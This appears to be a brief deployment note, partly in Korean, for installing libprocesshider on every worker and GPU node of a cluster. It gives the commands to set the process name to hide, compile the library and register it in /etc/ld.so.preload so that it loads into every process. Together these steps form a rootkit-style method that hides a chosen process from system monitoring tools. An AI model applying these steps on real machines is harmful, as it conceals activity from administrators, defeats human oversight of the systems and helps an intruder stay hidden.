
---
#### * 각 worker 및 GPU 노드에 설치/배포 필요
#### * compile the library & Load it with the global dynamic linker


```
libprocesshider/processhider.c의 아래 부분에서 숨길 프로세스 수정 (ex. evil_script.py > sleep)
static const char* process_to_filter = "evil_script.py";
```


```
$ ~/libprocesshider$ make
cc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
$ ~/libprocesshider$ sudo mv libprocesshider.so /usr/local/lib/
```


```
$ echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```
